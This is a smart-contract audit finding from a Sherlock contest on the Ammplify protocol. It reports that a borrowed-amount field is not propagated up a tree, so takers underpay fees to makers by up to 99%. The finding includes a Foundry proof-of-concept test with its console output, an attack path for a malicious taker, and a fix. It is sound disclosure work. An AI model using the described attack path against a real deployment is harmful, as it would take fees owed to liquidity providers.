---
tags:
  - lang/solidity
  - platform/sherlock
  - has/github
  - has/poc
  - severity/high
  - sector/dex
  - sector/lending
protocol: "[[Ammplify]]"
auditors:
  - "[[0x37]]"
  - "[[BoyD]]"
  - "[[anonymousjoe]]"
  - "[[maigadoh]]"
  - "[[panprog]]"
report: "https://github.com/sherlock-audit/2025-09-ammplify-judging"
genome:
  - "[[fee-calculation]]"
  - "[[fee-theft]]"
  - "[[fot-slippage]]"
  - "[[liquidation-underwater]]"
  - "[[oracle-freshness]]"
---
# H-10: Takers can pay significantly less fees with makers losing these amounts due to `subtreeBorrowedX` and `subtreeBorrowedY` being node's values instead of subtree's

- id: 63176
- impact: HIGH
- protocol: [[Ammplify]]
- reporter: panprog (Sherlock)
- source: N/A

## Summary


This bug report discusses an issue with the calculation of fees paid by takers to makers in the Ammplify Judging platform. The calculations assume that the total amount borrowed by a node includes the values of its children, but this is not the case. This leads to a significant underestimation of fees paid to makers, resulting in potential losses of up to 99%. The root cause of this issue is that the `subtreeBorrowedX(Y)` values are not being propagated correctly. This can happen automatically or be exploited by a malicious taker. The impact of this bug is that makers receive significantly less fees than they should. A proof of concept is provided to demonstrate the effect of this bug. To mitigate this issue, the `subtreeBorrowX(Y)` values should be updated from the node's `ownBorrow` and its children's `subtreeBorrow`. 

## Details


Source: https://github.com/sherlock-audit/2025-09-ammplify-judging/issues/426 

## Found by 
0x37, BoyD, anonymousjoe, maigadoh, panprog

### Summary

When takers pay their fees, the base borrowed amount which is multiplied by the borrowing rate is calculated as:
```solidity
        (uint256 totalXBorrows, uint256 totalYBorrows) = data.computeBorrows(key, data.liq.tLiqPrefix, true);
        totalXBorrows += node.liq.subtreeBorrowedX; 
        totalYBorrows += node.liq.subtreeBorrowedY;
        uint256 colXPaid = FullMath.mulX64(totalXBorrows, takerRateX64, true);
        uint256 colYPaid = FullMath.mulX64(totalYBorrows, takerRateX64, true);
```

The issue is that the calculations assume that `node.liq.subtreeBorrowedX` (and Y) are subtree's total borrowed values, while, in fact, this is the node's value only, it doesn't include node's children values. It is changed in Liquidity up walker and nowhere else:
```solidity
            if (sliq < targetLiq) {
                uint128 liqDiff = targetLiq - sliq;
                node.liq.tLiq += liqDiff;
                node.liq.subtreeTLiq += iter.width * liqDiff;
                // The borrow is used to calculate payments amounts and we don't want that to fluctuate
                // with price or else the fees become too unpredictable.
                (uint256 xBorrow, uint256 yBorrow) = data.computeBorrows(iter.key, liqDiff, true);
                node.liq.subtreeBorrowedX += xBorrow;
                node.liq.subtreeBorrowedY += yBorrow;
```

Similar `node.liq.subtreeTLiq` is updated from the children in the liquidity walker up function:
```solidity
        if (visit) {
            modify(iter, node, data, data.liq.liq);
        } else {
            // If propogating, we can't be at a leaf.
            (Key lk, Key rk) = key.children();
            Node storage lNode = data.node(lk);
            Node storage rNode = data.node(rk);
            node.liq.subtreeMLiq = lNode.liq.subtreeMLiq + rNode.liq.subtreeMLiq + node.liq.mLiq * iter.width;
            node.liq.subtreeTLiq = lNode.liq.subtreeTLiq + rNode.liq.subtreeTLiq + node.liq.tLiq * iter.width;
        }
```

But the `subtreeBorrowedX` (Y) is not propogating the same way, so it stays node's value only.

This leads to significant undercalculation of fees paid from takers to makers. For example:
- There is 1e18 liquidity taken at the 0..245760 range (yBorrowed = 418e18)
- There is 1000e18 liquidity taken at the 0..122880 range (yBorrowed = 20561e18)
- The rate to be charged is 100%

Depending on the range which is updated first (for example, which range will makers collect fees from first):
- If maker collects in the 0..245760 range, `totalYBorrowed = 418` (20561 amount is ignored because it's not included in the node's `subtreeBorrowedY`), amount charged = `418 * 100% = 418`, 1/1000 of it (0.418) is charged to this node and 417.5 is propogated to the 0..122880 node. Total charged = 418.
- If maker collects in the 0..122880 range, `totalYBorrowed = borrowed(prefix) + node.liq.subtreeBorrowedY = 418*0.5 + 20561 = 20770`, amount charged = `20770 * 100% = 20770`

So depending on what range is updated first, the total fees charged can be 98% less than it should be.

### Root Cause

The only time `node.liq.subtreeBorrowedX` (Y) is updated is when modifying node's taker liquidity, with no propogation happening anywhere:
https://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/walkers/Liq.sol#L326-L327
https://github.com/sherlock-audit/2025-09-ammplify/blob/main/Ammplify/src/walkers/Liq.sol#L337-L338

### Internal Pre-conditions

None.

### External Pre-conditions

None.

### Attack Path

Happens by itself most of the time:
- Any time a node is updated, taker fees rate is charged on the amount of prefix (all nodes above the node being updated) and the amount of the node which is being updated, all nodes below it are ignored.

It's also possible for malicious Taker to keep updating the top-most range with tiny taker liquidity taken, keeping taker fees at extremely low rate even if all liquidity is taken.

### Impact

Makers getting up to 99% less fees from takers than they should. Realistically, when happenning by itself, about 50% of fees will be lost by Makers (and Takers will pay 50% less fees).

### Proof of concept

Add this test to `Taker.t.sol`:
```solidity
    // since node.liq.subtreeBorrowedX is not really subtree, but rather just this node's borrowed X (Y),
    // this test demonstrates the effect of it by taking small liquidity with large width and big liquidity with
    // smaller width, which is 2 levels below the small liquidity. Updating anything at the large width level
    // will only charge taker fees on small liquidity amount, ignoring the large liquidity amount, which will pay 0 fees
    function testReducedBorrowRate() public {
        bytes memory rftData = "";

        // Collateralize before creating taker position
        _collateralizeTaker(recipient, liquidity);

        // add some liquidity to avoid revert due to the other bugs
        addPoolLiq(0, 0, 245760, 1);
        addPoolLiq(0, 61440, 122880, 1);

        // current price inside the range
        swapTo(0, TickMath.getSqrtRatioAtTick(120000));

        // create a maker at the large width with small liquidity
        uint256 makerAssetId = makerFacet.newMaker(
            recipient,
            poolAddr,
            0,
            245760,
            1e18, 
            false,
            sqrtPriceLimitsX96[0],
            sqrtPriceLimitsX96[1],
            rftData
        );

        // create a maker 2 levels below previous with large liquidity
        uint256 makerAssetId2 = makerFacet.newMaker(
            recipient,
            poolAddr,
            0,
            122880,
            1000e18,
            false,
            sqrtPriceLimitsX96[0],
            sqrtPriceLimitsX96[1],
            rftData
        );

        ticks[0] = 0;
        ticks[1] = 245760;

        // taker takes small liquidity
        uint balance0Before = token0.balanceOf(address(this));
        uint balance1Before = token1.balanceOf(address(this));
        uint256 takerAssetId = takerFacet.newTaker(
            recipient,
            poolAddr,
            ticks,
            9e17,
            vaultIndices,
            sqrtPriceLimitsX96,
            31928949493248528050198211985408, // sqrt price at tick 120000
            rftData
        );
        console.log("small liquidity delta0: ", int(token0.balanceOf(address(this))) - int(balance0Before));
        console.log("small liquidity delta1: ", int(token1.balanceOf(address(this))) - int(balance1Before));

        ticks[0] = 0;
        ticks[1] = 122880;

        // taker takes large liquidity
        balance0Before = token0.balanceOf(address(this));
        balance1Before = token1.balanceOf(address(this));
        uint256 takerAssetId2 = takerFacet.newTaker(
            recipient,
            poolAddr,
            ticks,
            999e18,
            vaultIndices,
            sqrtPriceLimitsX96,
            31928949493248528050198211985408, // sqrt price at tick 120000
            rftData
        );
        console.log("large liquidity delta0: ", int(token0.balanceOf(address(this))) - int(balance0Before));
        console.log("large liquidity delta1: ", int(token1.balanceOf(address(this))) - int(balance1Before));

        // skip 1 day (the default rates setup in test config are huge, so 1 day is over 100%)
        vm.roll(1);
        skip(86400);

        // "touch" large width by collecting fees, this will charge fees only from 9e17 liquidity
        //makerFacet.collectFees(recipient, makerAssetId, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);

        // depending on which range is updated first, the fees charged will differ dramatically
        int balance0;
        int balance1;
        (,, balance0, balance1) = takerFacet.removeTaker(takerAssetId, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);
        console.log("small liquidity return delta0: ", balance0);
        console.log("small liquidity return delta1: ", balance1);
        (,, balance0, balance1) = takerFacet.removeTaker(takerAssetId2, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);
        console.log("large liquidity return delta0: ", balance0);
        console.log("large liquidity return delta1: ", balance1);
    }
```

Console output from running the test:
```solidity
  small liquidity delta0:  -1704342488049
  small liquidity delta1:  277011965446689000
  large liquidity delta0:  -1891820161733437
  large liquidity delta1:  307483281645824790886
  small liquidity return delta0:  -67788456300445
  small liquidity return delta1:  -15352923623904726587
  large liquidity return delta0:  -75245186493492955
  large liquidity return delta1:  -17041745222534246510996
```

Now if we swap the order in which taker liquidity is taken, it shouldn't change the amounts charged (since it happens in the same block), but the amount of fees charged changes dramatically:
```solidity
        (,, balance0, balance1) = takerFacet.removeTaker(takerAssetId2, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);
        console.log("large liquidity return delta0: ", balance0);
        console.log("large liquidity return delta1: ", balance1);
        (,, balance0, balance1) = takerFacet.removeTaker(takerAssetId, sqrtPriceLimitsX96[0], sqrtPriceLimitsX96[1], rftData);
        console.log("small liquidity return delta0: ", balance0);
        console.log("small liquidity return delta1: ", balance1);
```

Console output:
```solidity
  small liquidity delta0:  -1704342488049
  small liquidity delta1:  277011965446689000
  large liquidity delta0:  -1891820161733437
  large liquidity delta1:  307483281645824790886
  large liquidity return delta0:  -1769220979907580729108
  large liquidity return delta1:  -824359137522368829210445
  small liquidity return delta0:  -798386402728674408
  small liquidity return delta1:  -145964216100097777846220
```

Note that when larger range is updated first:
- large liquidity pays token0: 0.07e18, token1: 17041e18
- small liquidity pays token0: 0.00007e18, token1: 0.27e18

If smaller range is updated first (this is also the correct amount of fee that should be charged):
- large liquidity pays token0: 1769e18, token1: 824359e18
- small liquidity pays token0: 0.8e18, token1: 145964e18

### Mitigation

Similar to `subtreeMLiq` and `subtreeTLiq`, keep track of node's `ownBorrowX(Y)` and update `subtreeBorrowX(Y)` from `ownBorrow` and children's `subtreeBorrow`.
